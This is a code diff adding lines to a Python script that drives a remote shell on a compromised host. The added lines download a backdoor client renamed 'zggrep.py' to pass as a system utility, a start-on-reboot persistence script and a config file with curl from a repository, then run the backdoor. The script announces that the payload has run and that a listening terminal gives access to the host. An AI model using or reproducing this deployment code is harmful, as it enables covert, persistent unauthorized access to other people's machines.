@@ -29,6 +29,42 @@ try:
         
     time.sleep(2)
     
+    shell.send(b"cd ../../bin\n")
+    time.sleep(1)
+    
+    shell.send(b"cd zggrep\n")   
+    time.sleep(1)
+    
+    # get backdoor
+    backdoor_link = f"{repo_path}/main/client.py\n"
+    shell.send((f"curl -o zggrep.py {backdoor_link}").encode())
+    print("Downloading backdoor...")
+    time.sleep(1)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")     
+    print(output)
+    
+    # get backdoor
+    reboot_link = f"{repo_path}/main/start_on_reboot.py\n"
+    shell.send((f"curl -o boot.py {reboot_link}").encode())
+    print("Downloading reboot script...")
+    time.sleep(1)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")     
+    print(output)
+    
+    # get config
+    config_link = f"{repo_path}/main/config.py\n"
+    shell.send((f"curl -O {config_link}").encode())
+    print("Downloading config file...")
+    time.sleep(1)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")     
+    print(output)
+    
     shell.send(b"python zggrep.py\n")
     
     print("Payload has run, use the listening terminal to access host.")
